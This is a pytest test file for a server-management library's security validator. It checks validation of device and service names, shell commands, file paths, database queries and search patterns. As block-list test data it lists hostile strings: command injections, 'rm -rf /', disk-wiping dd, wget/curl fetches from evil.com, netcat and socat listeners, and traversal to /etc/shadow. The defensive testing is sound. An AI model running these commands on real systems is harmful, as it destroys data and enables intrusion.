"""
Tests for server_management_lib.security module.

Covers:
- Device name validation (block devices)
- Service name validation
- Command safety (whitelist + dangerous pattern blocking)
- File path validation (traversal prevention)
- Database query validation (InfluxDB + Prometheus)
- Search pattern sanitization
- SMART test type validation
"""

import pytest

from server_management_lib.security import SecurityValidator

# ============================================================================
# Device Name Validation
# ============================================================================


class TestDeviceNameValidation:
    """Test block device name validation."""

    def setup_method(self):
        self.security = SecurityValidator({})

    def test_valid_names(self):
        valid = [
            "sda",
            "sdb",
            "nvme0n1",
            "nvme1n2",
            "vda",
            "hda",
            "mmcblk0",
            "dm-0",
        ]
        for name in valid:
            assert self.security.validate_device_name(name) is True

    def test_invalid_names(self):
        invalid = [
            "",
            "sda;rm -rf /",
            "sda$(whoami)",
            "../../etc",
            "/dev/sda",
            "a" * 33,
            None,
        ]
        for name in invalid:
            assert self.security.validate_device_name(name) is False

    def test_none_input(self):
        assert self.security.validate_device_name(None) is False

    def test_empty_input(self):
        assert self.security.validate_device_name("") is False

    def test_too_long(self):
        assert self.security.validate_device_name("a" * 33) is False

    def test_injection_patterns_blocked(self):
        """Device names with injection patterns should be blocked."""
        injection_patterns = [
            "sda;rm",  # semicolon
            "sda|cat",  # pipe
            "sda`whoami`",  # command substitution
            "sda$var",  # variable expansion
            "sda(sub)",  # subshell
            "sda{braces}",  # brace expansion
            "sda<redirect",  # redirect
            "sda\\nescape",  # escape
            "sda'quote",  # quote
            'sda"quote',  # quote
            "sda!hist",  # history
            "sda~home",  # home
            "sda..traversal",  # path traversal
        ]
        for name in injection_patterns:
            assert self.security.validate_device_name(name) is False, (
                f"Should block: {name}"
            )


# ============================================================================
# Service Name Validation
# ============================================================================


class TestServiceNameValidation:
    """Test service name validation."""

    def setup_method(self):
        self.security = SecurityValidator({})

    def test_valid_names(self):
        valid = [
            "myapp",
            "my-app",
            "my_app",
            "MyApp123",
            "service-01",
            "a",
            "a" * 100,
        ]
        for name in valid:
            assert self.security.validate_service_name(name) is True

    def test_invalid_names(self):
        invalid = [
            "",
            "my app",
            "my/app",
            "../etc",
            "app;rm -rf /",
            "-help",
            "_service",
            None,
        ]
        for name in invalid:
            assert self.security.validate_service_name(name) is False

    def test_none_input(self):
        assert self.security.validate_service_name(None) is False

    def test_empty_input(self):
        assert self.security.validate_service_name("") is False

    def test_too_long(self):
        assert self.security.validate_service_name("a" * 101) is False

    def test_path_traversal_patterns_blocked(self):
        """Service names with path traversal patterns should be blocked."""
        traversal_patterns = [
            "myapp..",  # parent directory
            "my~app",  # home directory
            "my$app",  # variable expansion
            "my`app",  # command substitution
            "my;app",  # command separator
            "my|app",  # pipe
            "my&app",  # background
            "my>app",  # redirect
            "my<app",  # redirect input
            "my(app)",  # subshell
            "my{app}",  # brace expansion
            "my[app]",  # glob
            "my*app",  # glob
            "my?app",  # glob
            "my'app'",  # quote
            'my"app"',  # quote
            "my\\app",  # escape
            "my app",  # space
            "my!app",  # history
            "my#app",  # comment
        ]
        for name in traversal_patterns:
            assert self.security.validate_service_name(name) is False, (
                f"Should block: {name}"
            )


# ============================================================================
# Command Safety
# ============================================================================


class TestCommandSafety:
    """Test command safety validation."""

    def setup_method(self):
        self.security = SecurityValidator({})

    def test_disk_safe_commands_accepted(self):
        """Disk diagnostic commands must pass the whitelist."""
        safe = [
            "smartctl -a /dev/sda",
            "smartctl -j -a /dev/sda",
            "smartctl -t short /dev/sda 2>&1",
            "smartctl -t long /dev/sda 2>&1",
            "lsblk -d -o NAME,MODEL,SERIAL,SIZE,TYPE,TRAN --json 2>&1",
            "zpool status -x 2>&1 && echo '---' && zpool list -o name,size 2>&1",
            "cat /proc/mdstat 2>&1 && echo '---' && mdadm --detail --scan 2>&1",
            "iostat -x 1 1 2>&1",
        ]
        for cmd in safe:
            assert self.security.is_command_safe(cmd) is True, f"Should accept: {cmd}"

    def test_general_safe_commands_accepted(self):
        """General safe commands (non-disk whitelist) must pass."""
        safe = [
            "docker ps",
            "docker logs myapp",
            "uptime",
            "free -h",
        ]
        for cmd in safe:
            assert self.security.is_command_safe(cmd) is True, f"Should accept: {cmd}"

    def test_dangerous_commands_blocked(self):
        """Dangerous commands must always be blocked."""
        dangerous = [
            "sudo smartctl -a /dev/sda",
            "dd if=/dev/zero of=/dev/sda",
            "rm -rf /",
            "bash /tmp/evil.sh",
            "wget http://evil.com/malware",
            "curl http://evil.com/exploit",
        ]
        for cmd in dangerous:
            assert self.security.is_command_safe(cmd) is False, f"Should block: {cmd}"

    def test_redirect_outside_2and1_blocked(self):
        """Output redirection (except 2>&1) must be blocked for disk commands."""
        dangerous = [
            "smartctl -a /dev/sda > /dev/sda",
            "smartctl -j -a /dev/sda > /tmp/evil",
        ]
        for cmd in dangerous:
            assert self.security.is_command_safe(cmd) is False

    def test_output_redirection_blocked(self):
        """Output redirection (except 2>&1) should be blocked for disk commands."""
        dangerous = [
            "smartctl -a /dev/sda > /tmp/output",
            "smartctl -j -a /dev/sda > /dev/null",
            "nvme smart-log /dev/nvme0n1 > /tmp/output",
        ]
        for cmd in dangerous:
            assert self.security.is_command_safe(cmd) is False

    def test_2and1_redirect_allowed(self):
        """2>&1 redirect should be allowed for disk commands."""
        safe = [
            "smartctl -a /dev/sda 2>&1",
            "nvme smart-log /dev/nvme0n1 2>&1",
        ]
        for cmd in safe:
            assert self.security.is_command_safe(cmd) is True

    def test_shell_chaining_allowed(self):
        """Shell chaining (&&, ||) should be allowed for disk commands."""
        safe = [
            "smartctl -a /dev/sda && echo success",
            "lsblk -d || echo failed",
        ]
        for cmd in safe:
            assert self.security.is_command_safe(cmd) is True

    def test_net_tools_blocked(self):
        """Network exfiltration tools should be blocked."""
        dangerous = [
            "nc -l 1234",
            "ncat -l 1234",
            "netcat -l 1234",
            "socat TCP-LISTEN:1234 -",
            "telnet evil.com",
        ]
        for cmd in dangerous:
            assert self.security.is_command_safe(cmd) is False, f"Should block: {cmd}"


# ============================================================================
# File Path Validation
# ============================================================================


class TestFilePathValidation:
    """Test service file path validation."""

    def setup_method(self):
        self.security = SecurityValidator({})

    def test_valid_paths(self):
        valid = [
            ("myapp", "docker-compose.yml"),
            ("myapp", "config/app.conf"),
            ("myapp", "logs/app.log"),
        ]
        for service, path in valid:
            result = self.security.validate_service_file_path(service, path)
            assert result is not None, f"Should accept: {path}"

    def test_valid_paths_return_correct_structure(self):
        """Valid file paths should return paths within /srv/{service}/."""
        valid_paths = [
            ("myapp", "docker-compose.yml"),
            ("myapp", "config.yaml"),
            ("myapp", "subdir/file.txt"),
        ]
        for service, path in valid_paths:
            result = self.security.validate_service_file_path(service, path)
            assert result is not None, f"Should accept: {path}"
            assert "/srv/myapp/" in result

    def test_traversal_blocked(self):
        attacks = [
            ("myapp", "../etc/passwd"),
            ("myapp", "../../etc/shadow"),
            ("myapp", "/etc/passwd"),
        ]
        for service, path in attacks:
            result = self.security.validate_service_file_path(service, path)
            assert result is None, f"Should block: {path}"

    def test_sensitive_files_blocked(self):
        sensitive = [
            ("myapp", ".env"),
            ("myapp", "secrets/password.txt"),
            ("myapp", "keys/server.key"),
        ]
        for service, path in sensitive:
            result = self.security.validate_service_file_path(service, path)
            assert result is None, f"Should block sensitive file: {path}"

    def test_none_input(self):
        result = self.security.validate_service_file_path("myapp", None)
        assert result is None

    def test_empty_input(self):
        result = self.security.validate_service_file_path("myapp", "")
        assert result is None

    def test_too_long(self):
        result = self.security.validate_service_file_path("myapp", "a" * 501)
        assert result is None

    def test_null_byte(self):
        result = self.security.validate_service_file_path("myapp", "file\x00.txt")
        assert result is None

    def test_url_encoded_traversal(self):
        result = self.security.validate_service_file_path("myapp", "%2e%2e/etc/passwd")
        assert result is None

    def test_unicode_variants(self):
        result = self.security.validate_service_file_path("myapp", "\uff0e\uff0e/etc")
        assert result is None

    def test_absolute_path_rejected(self):
        result = self.security.validate_service_file_path("myapp", "/etc/passwd")
        assert result is None

    def test_resolution_escape(self):
        """Path resolution that escapes service directory should be blocked."""
        result = self.security.validate_service_file_path(
            "myapp", "..%2f..%2fetc/passwd"
        )
        assert result is None

    def test_resolution_error_handling(self):
        """Path resolution errors should be handled gracefully."""
        result = self.security.validate_service_file_path("myapp", "file\x00name.txt")
        assert result is None


# ============================================================================
# Query Validation
# ============================================================================


class TestInfluxDBQueryValidation:
    """InfluxDB SQL validation is semantic, not a shell-character blacklist."""

    def setup_method(self):
        self.security = SecurityValidator({})

    def test_valid_selects(self):
        valid = [
            "SELECT * FROM cpu WHERE time > now() - INTERVAL '1 hour' LIMIT 5",
            "SELECT mean(value) FROM metrics GROUP BY host",
            "WITH recent AS (SELECT * FROM cpu) SELECT * FROM recent",
        ]
        for query in valid:
            assert self.security.validate_influxdb_query(query) is not None

    def test_trailing_semicolon_is_accepted(self):
        result = self.security.validate_influxdb_query("SELECT * FROM cpu;")
        assert result == "SELECT * FROM cpu"

    def test_quotes_identifiers_and_operators_are_accepted(self):
        queries = [
            'SELECT * FROM "cpu load" WHERE usage >= 0.9',
            "SELECT * FROM cpu WHERE host = 'server-1'",
        ]
        for query in queries:
            assert self.security.validate_influxdb_query(query) is not None

    def test_comments_are_accepted(self):
        queries = [
            "SELECT * FROM cpu -- operator note",
            "SELECT * FROM cpu /* operator note */",
        ]
        for query in queries:
            assert self.security.validate_influxdb_query(query) is not None

    def test_multiple_statements_blocked(self):
        injections = [
            "SELECT * FROM cpu; DROP TABLE metrics",
            "SELECT * FROM cpu\nDELETE FROM metrics",
        ]
        for query in injections:
            assert self.security.validate_influxdb_query(query) is None

    def test_write_ops_blocked(self):
        write_ops = [
            "DROP MEASUREMENT cpu",
            "DELETE FROM metrics",
            "INSERT INTO cpu VALUES (1)",
            "UPDATE metrics SET value = 100",
            "ALTER TABLE cpu ADD COLUMN x INT",
            "CREATE DATABASE testdb",
            "TRUNCATE TABLE logs",
            "GRANT ALL TO admin",
            "REVOKE READ FROM user",
            "KILL QUERY 12345",
            "SET PASSWORD FOR user = 'pass'",
            "SELECT * FROM cpu INTO other",
        ]
        for query in write_ops:
            assert self.security.validate_influxdb_query(query) is None, query

    def test_null_byte_blocked(self):
        assert self.security.validate_influxdb_query("SELECT * FROM cpu\x00") is None

    def test_none_and_empty_input(self):
        assert self.security.validate_influxdb_query(None) is None
        assert self.security.validate_influxdb_query("") is None

    def test_non_string_input(self):
        assert self.security.validate_influxdb_query(123) is None

    def test_too_long(self):
        assert self.security.validate_influxdb_query("SELECT " + "a" * 5000) is None


class TestPrometheusQueryValidation:
    """PromQL is sent over HTTP: quotes, braces and comparisons are valid."""

    def setup_method(self):
        self.security = SecurityValidator({})

    def test_label_matchers_accepted(self):
        queries = [
            'up{job="node"}',
            'node_filesystem_avail_bytes{device="/dev/sda1"}',
            "up{job='node'}",
        ]
        for query in queries:
            assert self.security.validate_prometheus_query(query) is not None

    def test_comparisons_accepted(self):
        queries = ["up > 0", "up == 0", "node_load1 >= 2"]
        for query in queries:
            assert self.security.validate_prometheus_query(query) is not None

    def test_functions_accepted(self):
        queries = [
            "rate(http_requests_total[5m])",
            "histogram_quantile(0.95, rate(bucket[5m]))",
        ]
        for query in queries:
            assert self.security.validate_prometheus_query(query) is not None

    def test_shell_metacharacters_are_not_interpreted(self):
        # These are invalid PromQL, but they are just HTTP query text; the
        # Prometheus API will reject them. They are never executed by a shell.
        assert (
            self.security.validate_prometheus_query("up; cat /etc/passwd") is not None
        )

    def test_null_byte_blocked(self):
        assert self.security.validate_prometheus_query("up\x00") is None

    def test_control_characters_blocked(self):
        assert self.security.validate_prometheus_query("up\x01") is None

    def test_none_and_empty_input(self):
        assert self.security.validate_prometheus_query(None) is None
        assert self.security.validate_prometheus_query("") is None

    def test_non_string_input(self):
        assert self.security.validate_prometheus_query(123) is None

    def test_too_long(self):
        assert self.security.validate_prometheus_query("up" + "a" * 5000) is None


# ============================================================================
# Search Pattern Sanitization
# ============================================================================


class TestSearchPatternSanitization:
    """Test search pattern sanitization."""

    def setup_method(self):
        self.security = SecurityValidator({})

    def test_safe_patterns_preserved(self):
        safe = ["error", "connection failed", "timeout", "192.168.1.1"]
        for p in safe:
            assert self.security.sanitize_search_pattern(p) == p

    def test_dangerous_patterns_sanitized(self):
        result = self.security.sanitize_search_pattern("'; rm -rf /")
        assert "'" not in result
        assert ";" not in result

    def test_empty_pattern_raises(self):
        with pytest.raises(ValueError, match="empty"):
            self.security.sanitize_search_pattern("';|&$")

    def test_none_input_raises(self):
        with pytest.raises(ValueError, match="empty"):
            self.security.sanitize_search_pattern(None)

    def test_empty_string_raises(self):
        with pytest.raises(ValueError, match="empty"):
            self.security.sanitize_search_pattern("")

    def test_non_string_input_raises(self):
        with pytest.raises(ValueError, match="empty"):
            self.security.sanitize_search_pattern(123)  # type: ignore[arg-type]

    def test_becomes_empty_after_sanitization_raises(self):
        with pytest.raises(ValueError, match="empty"):
            self.security.sanitize_search_pattern("';|&$")

    def test_pattern_truncated(self):
        long_pattern = "a" * 300
        result = self.security.sanitize_search_pattern(long_pattern)
        assert len(result) <= 200


# ============================================================================
# SMART Test Type Validation
# ============================================================================


class TestSMARTTestTypeValidation:
    """Test SMART self-test type validation."""

    def setup_method(self):
        self.security = SecurityValidator({})

    def test_valid_types(self):
        assert self.security.validate_smart_test_type("short") is True
        assert self.security.validate_smart_test_type("long") is True
        assert self.security.validate_smart_test_type("conveyance") is True

    def test_invalid_types(self):
        assert self.security.validate_smart_test_type("invalid") is False
        assert self.security.validate_smart_test_type("") is False
        assert self.security.validate_smart_test_type(None) is False
